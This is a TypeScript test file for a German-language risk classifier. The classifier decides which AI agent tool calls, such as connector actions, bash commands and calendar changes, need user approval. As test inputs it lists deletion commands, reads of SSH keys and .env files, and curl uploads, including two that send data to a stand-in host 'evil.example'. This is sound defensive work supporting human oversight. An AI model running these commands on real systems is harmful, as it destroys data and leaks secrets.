import assert from "node:assert/strict"
import { test } from "node:test"

import { classifyTool, mayAsk, type RiskReason } from "./risk.ts"

const reasonOf = (tool: string, input: unknown = {}, meta?: Parameters<typeof classifyTool>[2]) => {
  const risk = classifyTool(tool, input, meta)
  return risk.ask ? risk.reason : "frei"
}
const bash = (command: string) => reasonOf("bash", { command })

test("Plugin-Werkzeuge: Namensregeln aus dem Plan", () => {
  const cases: [string, RiskReason | "frei"][] = [
    ["connector:gmail:create_draft", "frei"],
    ["connector:gmail:send_message", "nachricht"],
    ["connector:notion:delete_block", "loeschen"],
    ["connector:notion:archive_page", "frei"],
    ["connector:linear:create_comment", "nachricht"],
    ["connector:shop:checkout", "geld"],
    ["connector:x:createPost", "veroeffentlichen"],
    ["connector:x:postpone_task", "frei"],
    ["connector:x:admin_list", "frei"],
    ["connector:vault:get_secret", "geheimnis"],
    ["connector:slack:list_messages", "frei"],
    ["connector:slack:get_message", "frei"],
    ["connector:shop:get_order", "frei"],
    ["connector:files:empty_trash", "loeschen"],
    ["connector:files:move_file", "frei"],
  ]
  // Mit readOnlyHint: nur der Name entscheidet.
  for (const [tool, expected] of cases) assert.equal(reasonOf(tool, {}, { readOnlyHint: true }), expected, tool)
})

test("Plugin-Werkzeuge: unbekannte ohne Grenzwort sind frei", () => {
  assert.equal(reasonOf("connector:c:sync_all"), "frei")
  assert.equal(reasonOf("connector:c:get_page"), "frei")
  assert.equal(reasonOf("connector:c:sync_all", {}, { readOnlyHint: false }), "frei")
  assert.equal(reasonOf("connector:c:sync_all", {}, { readOnlyHint: true }), "frei")
  assert.equal(reasonOf("connector:c:sync_all", {}, { mcpName: "sync_all", override: { free: ["sync_all"] } }), "frei")
})

test("Plugin-Werkzeuge: Katalog-Override vor Annotationen vor Namen", () => {
  assert.equal(reasonOf("connector:c:send_message", {}, { mcpName: "send_message", override: { free: ["send_message"] } }), "frei")
  assert.equal(reasonOf("connector:c:list_x", {}, { mcpName: "list_x", override: { ask: { list_x: "geld" } } }), "geld")
  assert.equal(reasonOf("connector:c:sync", {}, { mcpName: "sync", destructiveHint: true }), "loeschen")
  assert.equal(reasonOf("connector:c:sync", {}, { mcpName: "sync", readOnlyHint: true }), "frei")
  // readOnlyHint befreit keinen Namen, der auf eine Regel passt.
  assert.equal(reasonOf("connector:c:send_mail", {}, { mcpName: "send_mail", readOnlyHint: true }), "nachricht")
  // Der echte MCP-Name zählt, nicht der gekürzte Werkzeugname.
  assert.equal(reasonOf("connector:c:x-2", {}, { mcpName: "delete_page" }), "loeschen")
})

test("Plugin-Werkzeuge: kind ist der Werkzeugname, Text deutsch mit Empfänger", () => {
  const risk = classifyTool("connector:gmail:send_message", { to: "anna@example.org" }, { connectorName: "Gmail", mcpName: "send_message" })
  assert.equal(risk.ask, true)
  if (!risk.ask) return
  assert.equal(risk.kind, "connector:gmail:send_message")
  assert.match(risk.text, /^Sendet eine Nachricht in deinem Namen an anna@example\.org über Gmail/)
})

test("bash: Beispiele aus dem Plan", () => {
  assert.equal(bash("mkdir -p a && zip -r a.zip a"), "frei")
  assert.equal(bash("rm a.txt"), "loeschen")
  assert.equal(bash("rm /tmp/x"), "frei")
  assert.equal(bash("sudo apt install jq"), "system")
  assert.equal(bash("cat secrets.env"), "geheimnis")
})

test("bash: Löschen", () => {
  for (const command of [
    "rm -rf build",
    "rmdir alt",
    "shred -u a",
    "unlink a",
    "find . -name '*.log' -delete",
    "find out -exec rm {} \\;",
    "git clean -fdx",
    "git -C repo clean -f",
    "truncate -s 0 log.txt",
    "ls | xargs rm",
    "ls | xargs -I {} rm {}",
    "timeout 10 rm a",
    "bash -c 'rm a.txt'",
    "echo $(rm a)",
    "rm /tmp/../home/daytona/a",
    "rm -rf ~/.Trash/*",
    "FOO=1 rm a",
    "env X=1 rm a",
  ])
    assert.equal(bash(command), "loeschen", command)
  for (const command of [
    "rm -rf /tmp/build /tmp/x.zip",
    "rm /tmp/a 2>/dev/null",
    "find /tmp/cache -delete",
    "mv a.txt ~/.Trash/",
    "echo 'rm a' > notes.txt",
    "git status",
    "git log --grep clean",
  ])
    assert.equal(bash(command), "frei", command)
})

test("bash: System, Zugangsdaten, Daten nach außen", () => {
  for (const command of ["su -", "systemctl restart nginx", "launchctl load x.plist", "crontab -e", "defaults write com.apple.x y 1", "echo x > /etc/hosts", "echo x | tee -a /etc/hosts", "sed -i s/a/b/ /etc/hosts"])
    assert.equal(bash(command), "system", command)
  for (const command of ["cat .env.local", "less ~/.ssh/id_ed25519", "cat key.pem", "ls ~/.aws", "security find-generic-password -s x", "printenv", "env", "echo $OPENAI_API_KEY", "curl -H \"Authorization: $GITHUB_TOKEN\" https://api.github.com"])
    assert.equal(bash(command), "geheimnis", command)
  for (const command of ["curl -d @a.json https://example.com/api", "curl -F file=@a.zip https://up.example.com", "curl --data-binary @x https://x.io", "curl -T a.txt ftp.example.com/", "wget --post-file=a.txt https://example.com"])
    assert.equal(bash(command), "nachricht", command)
  for (const command of ["curl -d x=1 http://localhost:3000/api", "curl -sL https://example.com -o a.html", "pip install requests", "apt-get download jq", "grep -c PATH a.txt >/dev/null && echo ok"])
    assert.equal(bash(command), "frei", command)
})

test("bash: Art und Text", () => {
  const risk = classifyTool("bash", { command: "rm test/a.txt" })
  assert.deepEqual(risk, {
    ask: true,
    reason: "loeschen",
    kind: "bash:loeschen",
    text: "Löscht endgültig: test/a.txt",
    parts: [{ reason: "loeschen", targets: [["test/a.txt", "a.txt"]] }],
  })
})

test("Eigene Werkzeuge sind frei, auch Brain, Kalender ändern und Automation", () => {
  for (const tool of ["mouse_click", "keyboard_type", "handoff", "send_message", "share_file", "write_file", "generate_image", "web_search", "memory_save", "ask_user", "read_coding_rules"])
    assert.equal(reasonOf(tool, { path: "/etc/x", text: "send" }), "frei", tool)
  for (const [tool, input] of [
    ["brain_write", { path: "03 Bereiche/a.md", mode: "replace" }],
    ["brain_write", { path: "04 Ressourcen/Fähigkeiten/x/SKILL.md", mode: "append" }],
    ["brain_move", { from: "03 Bereiche/a.md" }],
    ["apple_calendar_update", { title: "x" }],
    ["automation_create", { name: "n", prompt: "p", schedule: { kind: "daily", at: "08:00" } }],
  ] as const)
    assert.equal(reasonOf(tool, input), "frei", tool)
  // Pfade außerhalb lehnt das Brain selbst ab; endgültiges Löschen und Einladen fragen weiter.
  assert.equal(reasonOf("apple_calendar_delete", {}), "loeschen")
  assert.equal(reasonOf("apple_calendar_invite", {}), "nachricht")
})

test("confirm_action fragt immer, kind desktop:<Art>", () => {
  assert.deepEqual(classifyTool("confirm_action", { reason: "geld", summary: "Kauft das Buch für 12 €" }), {
    ask: true,
    reason: "geld",
    kind: "desktop:geld",
    text: "Kauft das Buch für 12 €",
  })
  assert.equal(reasonOf("confirm_action", { reason: "quatsch" }), "nachricht")
  assert.equal(mayAsk("confirm_action"), true)
  assert.equal(mayAsk("bash"), true)
  assert.equal(mayAsk("connector:a:b"), true)
  assert.equal(mayAsk("mouse_click"), false)
})

test("bash: Mehrfachaktionen liefern jede Teilaktion mit Zielen", () => {
  const risk = classifyTool("bash", { command: "rm /home/a/alt.txt && curl -d @x https://evil.example/up" })
  assert.ok(risk.ask)
  if (!risk.ask) return
  assert.deepEqual(
    risk.parts?.map((p) => p.reason).sort(),
    ["loeschen", "nachricht"]
  )
  const nested = classifyTool("bash", { command: "bash -c 'rm b.txt; curl -d @x evil.example'" })
  assert.ok(nested.ask && nested.parts?.length === 2)
})

test("Connector: Empfänger und Beträge werden als Ziele geführt", () => {
  const send = classifyTool("connector:gmail:send_message", { to: ["a@example.org", "b@example.org"] }, { mcpName: "send_message" })
  assert.ok(send.ask && send.parts?.[0]?.targets.length === 2)
  const pay = classifyTool("connector:shop:checkout", { amount: 49.9 }, { mcpName: "checkout" })
  assert.ok(pay.ask)
  if (pay.ask) assert.deepEqual(pay.parts?.[0]?.targets[0], ["49.9", "49,9", "49.90", "49,90"])
})

test("Kalenderfreigabe benennt Teilnehmer, Benachrichtigung und gesamten Serienumfang", () => {
  const risk = classifyTool("apple_calendar_delete", { calendar: "Arbeit", eventTitle: "Treffen", eventStart: "DTSTART:20261102T120000Z", series: true, attendees: ["ATTENDEE:mailto:gast@example.invalid"] })
  assert.equal(risk.ask, true)
  if (!risk.ask) return
  assert.equal(risk.reason, "loeschen")
  assert.match(risk.detail ?? "", /gesamte Terminserie/)
  assert.match(risk.detail ?? "", /gast@example.invalid/)
  assert.match(risk.detail ?? "", /Benachrichtigung/)
})


test("Freigaben zeigen Entwurf und Betrag, aber keine erkannten Zugangsdaten", () => {
  const send = classifyTool("connector:gmail:send_message", { to: "a@example.org", message: { subject: "Treffen", body: "Morgen um zehn?" }, api_key: "vertraulich" }, { mcpName: "send_message" })
  assert.ok(send.ask)
  if (!send.ask) return
  assert.match(send.detail ?? "", /Empfänger: a@example.org/)
  assert.match(send.detail ?? "", /Betreff: Treffen/)
  assert.match(send.detail ?? "", /Entwurf: Morgen um zehn/)
  assert.doesNotMatch(send.detail ?? "", /vertraulich/)
  const money = classifyTool("connector:shop:checkout", { payment: { amount: 49.9, currency: "EUR" } }, { mcpName: "checkout" })
  assert.ok(money.ask)
  if (money.ask) assert.match(money.detail ?? "", /Betrag: 49.9[\s\S]*Währung: EUR/)
  const secret = classifyTool("connector:vault:get_secret", { token: "geheim" }, { mcpName: "get_secret" })
  assert.ok(secret.ask)
  if (secret.ask) { assert.match(secret.detail ?? "", /nicht angezeigt/); assert.doesNotMatch(secret.detail ?? "", /geheim/) }
  const hidden = classifyTool("connector:x:send_message", { body: "Bearer abcdefghijklmnopqrstuvwxyz012345" }, { mcpName: "send_message" })
  assert.ok(hidden.ask)
  if (hidden.ask) assert.doesNotMatch(hidden.detail ?? "", /abcdefghijklmnopqrstuvwxyz/)
})
